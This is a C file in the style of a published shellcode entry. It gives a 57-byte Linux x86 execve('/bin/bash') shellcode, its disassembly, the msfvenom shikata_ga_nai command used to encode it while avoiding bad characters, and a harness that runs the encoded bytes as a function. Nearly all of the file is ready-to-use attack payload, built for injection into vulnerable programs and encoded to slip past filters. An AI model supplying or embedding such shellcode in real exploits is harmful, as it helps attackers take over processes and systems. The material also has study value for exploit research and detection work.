/*
Title:    Linux x86 execve("/bin/bash") - shikata_ga_nai Encoded -  57 bytes
Author:   Amine Kanane <aminekanane_93@hotmail.com>
Desc:     Pop a /bin/bash Using The Stack

Disassembly of section .text:

08048060 <_start>:
 8048060:	31 c0                	xor    eax,eax
 8048062:	50                   	push   eax
 8048063:	89 e2                	mov    edx,esp
 8048065:	68 62 61 73 68       	push   0x68736162
 804806a:	68 2f 2f 2f 2f       	push   0x2f2f2f2f
 804806f:	68 2f 62 69 6e       	push   0x6e69622f
 8048074:	89 e3                	mov    ebx,esp
 8048076:	50                   	push   eax
 8048077:	53                   	push   ebx
 8048078:	89 e1                	mov    ecx,esp
 804807a:	b0 0b                	mov    al,0xb
 804807c:	cd 80                	int    0x80

Encoding Part :

echo -ne "\x31\xc0\x50\x89\xe2\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
| msfvenom -e x86/shikata_ga_nai -f c --arch x86 --platform linux --bad-chars '\x20\x0a\x0d\x00'

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = "\xdb\xdf\xd9\x74\x24\xf4\xbd\x5e\x75\x41\xf7\x58\x33\xc9\xb1"
                       "\x08\x31\x68\x19\x83\xc0\x04\x03\x68\x15\xbc\x80\x70\x37\x10"
                       "\xe2\x91\xdf\xf2\x95\x26\x48\x9a\x7a\xe6\xa7\x75\xed\xd7\xd5"
                       "\xe0\x83\xae\xf9\xa2\x08\x38\x1c\xf2\xa4\xf7\x5f";
main()
{
	printf("Shellcode Length: %d\n", strlen(code));

	int (*ret)() = (int(*)())code;
	ret();
}
